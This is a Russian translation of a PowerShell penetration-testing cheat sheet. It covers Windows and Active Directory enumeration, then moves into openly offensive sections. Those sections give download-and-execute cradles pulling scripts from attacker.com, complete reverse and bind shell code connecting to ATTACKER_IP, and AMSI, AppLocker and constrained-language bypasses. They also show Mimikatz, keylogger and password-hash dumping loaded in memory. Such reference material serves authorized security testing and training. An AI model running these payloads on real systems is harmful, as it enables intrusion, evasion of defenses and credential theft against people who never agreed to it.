<a id="-powershell---complete-pentesting-cheatsheet"></a>
# 💻 PowerShell — полная шпаргалка для тестирования на проникновение

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
[🇬🇧 English](../README.md) • [🇷🇺 Русский раздел](../../README.ru.md)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Post-Exploitation">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Основы](#-basics)
- [Сбор сведений о системе](#-system-enumeration)
- [Сбор сведений о пользователях](#-user-enumeration)
- [Сетевые команды](#-network-commands)
- [Операции с файлами](#-file-operations)
- [Управление процессами и службами](#-process--service-management)
- [Операции с реестром](#-registry-operations)
- [Active Directory](#-active-directory)
- [Скачивание и выполнение](#-download--execution)
- [Обратные командные оболочки (reverse shells)](#-reverse-shells)
- [Методы обхода ограничений](#-bypass-techniques)
- [Инструменты для наступательного тестирования](#-offensive-tools)
- [Однострочные команды](#-one-liners)

---

<a id="-basics"></a>
## 🔰 Основы

> **Совместимость:** примеры оригинала преимущественно ориентированы на Windows PowerShell 5.1. В PowerShell 7 удалены, в частности, Get-WmiObject и Get-EventLog, а доступность модулей и псевдонимов зависит от платформы и версии; см. [официальное сравнение версий](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell). Имена локальных групп и англоязычные строки systeminfo также зависят от языка Windows. Исходные команды сохранены буквально.

<a id="execution-policy"></a>
### Политика выполнения

> **Уточнение:** [политика выполнения](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) ограничивает случайный запуск скриптов, но не является границей безопасности. Scope Process действует в текущем процессе, а CurrentUser сохраняет настройку пользователя; эти две строки оригинала имеют разную область действия.

```powershell
# Проверить текущую политику
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Обойти политику выполнения (текущий сеанс)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Запустить скрипт с обходом политики выполнения
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

<a id="getting-help"></a>
### Получение справки

```powershell
# Получить справку по команде
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Обновить справку
Update-Help

# Перечислить все команды
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

<a id="variables--operators"></a>
### Переменные и операторы

```powershell
# Переменные
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Переменные окружения
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Операторы сравнения
-eq   # Равно
-ne   # Не равно
-gt   # Больше
-lt   # Меньше
-like # Сопоставление с шаблоном подстановочных символов
-match # Сопоставление с регулярным выражением
```

<a id="piping--filtering"></a>
### Конвейеры и фильтрация

```powershell
# Передать вывод по конвейеру
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Выбрать свойства
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Сортировка
Get-Process | Sort-Object CPU -Descending

# Форматировать вывод
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

<a id="-system-enumeration"></a>
## 🔍 Сбор сведений о системе

<a id="system-information"></a>
### Сведения о системе

```powershell
# Сведения о компьютере
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# Версия ОС
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Архитектура
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Обновления и исправления
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

<a id="installed-software"></a>
### Установленное программное обеспечение

```powershell
# 64-разрядное ПО
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# 32-разрядное ПО в 64-разрядной ОС
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# С помощью WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Краткий список
Get-Package
```

<a id="antivirus--security"></a>
### Антивирус и средства защиты

```powershell
# Получить сведения об антивирусе
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Защитник Windows

# Состояние межсетевого экрана
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Правила межсетевого экрана
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Исключения Защитника Windows
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

<a id="scheduled-tasks"></a>
### Задания планировщика

```powershell
# Перечислить задания планировщика
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Подробности задания
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

<a id="-user-enumeration"></a>
## 👤 Сбор сведений о пользователях

<a id="local-users"></a>
### Локальные пользователи

```powershell
# Текущий пользователь
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Все локальные пользователи
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Сведения о пользователе
Get-LocalUser Administrator
net user Administrator

# Группы пользователя
Get-LocalGroupMember Administrators
net localgroup Administrators
```

<a id="user-privileges"></a>
### Привилегии пользователя

```powershell
# Текущие привилегии
whoami /priv
whoami /all
whoami /groups

# Проверить, является ли пользователь администратором
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

<a id="groups"></a>
### Группы

```powershell
# Перечислить локальные группы
Get-LocalGroup
net localgroup

# Участники группы
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

<a id="logged-in-users"></a>
### Пользователи, вошедшие в систему

```powershell
# Текущие сеансы входа
query user
quser
qwinsta

# Недавние входы
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

<a id="-network-commands"></a>
## 🌐 Сетевые команды

<a id="network-configuration"></a>
### Настройка сети

```powershell
# Настройка IP
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Маршруты
Get-NetRoute
route print

# Таблица ARP
Get-NetNeighbor
arp -a
```

<a id="open-ports--connections"></a>
### Открытые порты и соединения

```powershell
# Соединения TCP
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# Конечные точки UDP
Get-NetUDPEndpoint

# Найти процесс по порту
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

<a id="network-testing"></a>
### Проверка сети

```powershell
# Проверка доступности (ping)
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Проверка порта
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Трассировка маршрута
Test-NetConnection -ComputerName google.com -TraceRoute

# DNS-запрос
Resolve-DnsName google.com
nslookup google.com
```

<a id="network-shares"></a>
### Общие сетевые ресурсы

```powershell
# Перечислить общие ресурсы
Get-SmbShare
net share

# Подключить сетевой диск
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# Перечислить подключённые общие ресурсы
Get-SmbConnection
net use

# Обратиться к общему ресурсу
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

<a id="-file-operations"></a>
## 📁 Операции с файлами

<a id="navigation--listing"></a>
### Навигация и просмотр содержимого

```powershell
# Текущий каталог
Get-Location
pwd

# Сменить каталог
Set-Location C:\Users
cd C:\Users

# Перечислить файлы
Get-ChildItem
Get-ChildItem -Force  # Включить скрытые файлы
Get-ChildItem -Recurse
ls
dir

# Перечислить скрытые файлы
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

<a id="file-search"></a>
### Поиск файлов

```powershell
# Найти файлы по имени
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Найти файлы, содержащие текст
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Найти большие файлы
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Найти недавно изменённые файлы
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

<a id="read--write-files"></a>
### Чтение и запись файлов

```powershell
# Прочитать файл
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Записать в файл
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Дополнить файл

# Копирование, перемещение и удаление
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

<a id="alternate-data-streams-ads"></a>
### Альтернативные потоки данных (ADS)

> **Синтаксис оболочки:** примеры dir /a:h, dir /r и more < ... в оригинале используют соглашения cmd.exe; их нельзя считать эквивалентными синтаксису PowerShell. В PowerShell dir — псевдоним Get-ChildItem, а [оператор входного перенаправления < зарезервирован](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_redirection). Команды не исправлялись.

```powershell
# Перечислить альтернативные потоки данных
Get-Item file.txt -Stream *
dir /r file.txt

# Прочитать альтернативный поток данных
Get-Content file.txt -Stream secret
more < file.txt:secret

# Записать в альтернативный поток данных
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Удалить альтернативный поток данных
Remove-Item file.txt -Stream hidden
```

<a id="hashing"></a>
### Хеширование

```powershell
# Получить хеш файла
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Проверить хеш
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="-process--service-management"></a>
## ⚙️ Управление процессами и службами

<a id="processes"></a>
### Процессы

```powershell
# Перечислить процессы
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Сведения о процессе
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Запустить процесс
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # От имени администратора

# Остановить процесс
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

<a id="services"></a>
### Службы

> **Уточнение:** в Windows PowerShell 5.1 sc — [псевдоним Set-Content](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/set-content?view=powershell-5.1), поэтому строка sc query из оригинала не гарантирует вызов системной утилиты управления службами. Поведение зависит от разрешения имени команды в текущей оболочке.

```powershell
# Перечислить службы
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Сведения о службе
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Запуск и остановка служб
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Путь к исполняемому файлу службы (для проверки пути без кавычек)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

<a id="-registry-operations"></a>
## 📝 Операции с реестром

<a id="reading-registry"></a>
### Чтение реестра

```powershell
# Перечислить разделы реестра
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Получить значение параметра реестра
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Поиск в реестре
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

<a id="writing-registry"></a>
### Запись в реестр

```powershell
# Создать раздел
New-Item -Path HKCU:\SOFTWARE\MyKey

# Задать значение параметра
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Удалить
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

<a id="important-registry-locations"></a>
### Важные разделы реестра

```powershell
# Разделы автозапуска
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Удаление программ (установленное ПО)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (требуются права SYSTEM)
# HKLM:\SAM\SAM

# Секреты LSA
# HKLM:\SECURITY\Policy\Secrets
```

---

<a id="-active-directory"></a>
## 🏢 Active Directory

<a id="domain-information"></a>
### Сведения о домене

```powershell
# Сведения о домене
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Контроллеры домена
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Сведения о лесе AD
Get-ADForest

# Доверительные отношения
Get-ADTrust -Filter *
```

<a id="user-enumeration-ad"></a>
### Сбор сведений о пользователях AD

```powershell
# Все пользователи домена
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Конкретный пользователь
Get-ADUser -Identity administrator -Properties *

# Пользователи с заданным свойством
Get-ADUser -Filter {AdminCount -eq 1}  # Администраторы (подпись оригинала)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Учётные записи, потенциально подходящие для Kerberoasting

# Поиск пользователей
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

<a id="group-enumeration-ad"></a>
### Сбор сведений о группах AD

```powershell
# Все группы
Get-ADGroup -Filter *

# Группа Domain Admins
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Группа Enterprise Admins
Get-ADGroupMember "Enterprise Admins"

# Группы пользователя
Get-ADPrincipalGroupMembership username
```

<a id="computer-enumeration-ad"></a>
### Сбор сведений о компьютерах AD

```powershell
# Все компьютеры
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Контроллеры домена
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Серверы
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

<a id="gpo-information"></a>
### Сведения о групповых политиках (GPO)

```powershell
# Перечислить объекты групповой политики
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# Сведения об объекте групповой политики
Get-GPO -Name "Default Domain Policy"

# Отчёт по объекту групповой политики
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="-download--execution"></a>
## ⬇️ Скачивание и выполнение

<a id="download-files"></a>
### Скачивание файлов

```powershell
# Invoke-WebRequest (аналог wget/curl; см. примечание о версиях)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (в оригинале отмечен как более быстрый)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Скачать строку (для скриптов)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# Передача BITS (в оригинале отмечена как менее заметная)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (штатная системная утилита, LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

<a id="download--execute-in-memory"></a>
### Скачивание и выполнение в памяти

```powershell
# IEX — Invoke-Expression (выполнение без сохранения файла)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# С использованием переменной
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

<a id="encoded-execution"></a>
### Выполнение закодированной команды

```powershell
# Закодировать команду в Base64
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Выполнить закодированную команду
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Кодирование одной строкой
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

<a id="-reverse-shells"></a>
## 🔌 Обратные командные оболочки (reverse shells)

<a id="powershell-reverse-shell"></a>
### Обратная оболочка PowerShell

```powershell
# Обратная командная оболочка TCP
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

<a id="one-liner-reverse-shell"></a>
### Обратная оболочка одной строкой

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

<a id="bind-shell"></a>
### Оболочка с прослушиванием порта (bind shell)

```powershell
# Начать прослушивание порта
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Методы обхода ограничений

<a id="execution-policy-bypass"></a>
### Обход политики выполнения

```powershell
# Способы обхода
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Прочитать файл и передать по конвейеру
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Скачать строку (без файла на диске)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

<a id="amsi-bypass"></a>
### Обход AMSI

> **Уточнение к фрагменту:** блок C# объявляет тип и внешние функции, но не содержит собственно изменения памяти: полный код в оригинале опущен. Примеры обращения к внутренним полям AMSI и остальные методы обхода зависят от версии и настроек защиты; они не гарантируют обхода. Отсутствие файла на диске и кодирование Base64 также не означают отсутствия журналов или обнаружения.

```powershell
# Простой пример обхода AMSI (может обнаруживаться)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Обфусцированный вариант
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Изменение памяти (в оригинале указана необходимость прав администратора)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (в оригинале здесь опущен полный код обхода)
```

<a id="constrained-language-mode-bypass"></a>
### Обход ограниченного языкового режима

```powershell
# Проверить языковой режим
$ExecutionContext.SessionState.LanguageMode

# Если включён ConstrainedLanguage, в оригинале предлагаются:
# - PowerShell 2.0 (если доступен)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

<a id="applocker-bypass"></a>
### Обход AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Проверить правила AppLocker
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

<a id="-offensive-tools"></a>
## 🔫 Инструменты для наступательного тестирования

<a id="powersploit"></a>
### PowerSploit

```powershell
# Скачать
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (сбор сведений об AD)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (повышение привилегий)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

<a id="empirepowershell-empire"></a>
### Empire / PowerShell Empire

```powershell
# Выполнение stager из Empire (компонента начальной загрузки)
powershell -noP -sta -w 1 -enc <base64_payload>
```

<a id="nishang"></a>
### Nishang

```powershell
# Обратная командная оболочка
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Перехватчик нажатий клавиш
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

<a id="-one-liners"></a>
## ⚡ Однострочные команды

<a id="enumeration-one-liners"></a>
### Однострочные команды сбора сведений

```powershell
# Сведения о системе
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Пользователи
Get-LocalUser | Select Name,Enabled

# Установленное ПО
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Открытые порты
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Запущенные службы
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Задания планировщика
schtasks /query /fo TABLE | findstr /v "TaskName"

# Состояние антивируса
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Межсетевой экран
Get-NetFirewallProfile | Select Name,Enabled
```

<a id="download-one-liners"></a>
### Однострочные команды скачивания

```powershell
# Скачивание через PowerShell
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

<a id="command-table"></a>
### Справочная таблица команд

| Назначение | Команда |
|---------|---------|
| Текущий пользователь | `whoami` |
| Все пользователи | `Get-LocalUser` |
| Администраторы | `Get-LocalGroupMember Administrators` |
| Сведения о системе | `systeminfo` |
| Настройка IP | `Get-NetIPAddress` |
| Открытые порты | `Get-NetTCPConnection -State Listen` |
| Процессы | `Get-Process` |
| Службы | `Get-Service \| Where Status -eq Running` |
| Поиск файлов | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Поиск в содержимом | `Select-String -Path "C:\*" -Pattern "password"` |
| Скачивание файла | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Выполнение закодированной команды | `powershell -enc <base64>` |

---

<a id="-resources"></a>
## 📚 Полезные материалы

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Mimikatz](../../Mimikatz/translations/README.ru.md)
- [Повышение привилегий в Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.ru.md)

---

<p align="center">
  <b>💻 Осваивайте PowerShell для тестирования на проникновение!</b><br>
  <i>Мощный язык сценариев для Windows</i>
</p>
